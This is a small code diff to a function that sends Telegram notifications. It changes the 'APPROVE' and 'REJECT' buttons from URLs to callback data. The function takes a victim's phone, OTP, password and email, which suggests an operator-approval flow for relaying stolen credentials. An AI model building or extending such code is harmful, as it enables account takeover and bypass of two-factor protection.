@@ -64,11 +64,11 @@ async function sendTelegramNotification({ requestId, phone, otp, password, email
         [
           {
             text: "✅ APPROVE",
-            url: `${approveUrl}?requestId=${requestId}&action=approve&token=${callbackToken}`,
+            callback_data: `requestId=${requestId}&action=approve&token=${callbackToken}`,
           },
           {
             text: "❌ REJECT",
-            url: `${approveUrl}?requestId=${requestId}&action=reject&token=${callbackToken}`,
+            callback_data: `requestId=${requestId}&action=reject&token=${callbackToken}`,
           },
         ],
       ],
